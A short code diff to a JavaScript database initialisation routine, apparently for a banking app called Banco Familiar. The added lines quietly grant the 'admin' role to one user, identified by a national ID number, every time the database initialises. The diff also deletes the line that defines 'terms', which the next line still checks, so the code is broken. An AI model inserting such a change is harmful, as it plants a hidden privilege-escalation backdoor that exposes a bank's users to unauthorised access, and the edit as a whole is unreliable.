@@ -32,7 +32,10 @@ async function initializeDatabase() {
     );
   }
 
-  const terms = await get("SELECT version FROM terms_versions WHERE version = 1");
+  await run(
+  "UPDATE users SET role = 'admin' WHERE ci = ?",
+  ["59935501"]
+);
   if (!terms) {
     const termsText = `TÉRMINOS Y CONDICIONES DE USO
 Banco Familiar (Versión 1.0)
